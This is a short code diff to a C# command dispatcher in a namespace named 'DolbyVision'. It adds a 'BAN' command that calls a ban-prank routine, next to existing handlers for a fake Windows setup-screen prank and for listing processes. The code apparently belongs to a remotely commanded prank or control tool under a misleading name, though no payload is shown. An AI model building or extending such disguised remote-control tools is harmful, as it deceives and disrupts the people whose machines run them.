@@ -306,6 +306,10 @@ namespace DolbyVision
                 {
                     return StartOobePrank("Win11");
                 }
+                if (cmd.Equals("BAN", StringComparison.OrdinalIgnoreCase))
+                {
+                    return StartBanPrank();
+                }
                 if (cmd.Equals("PROCESS_LIST", StringComparison.OrdinalIgnoreCase))
                 {
                     return GetProcessList();
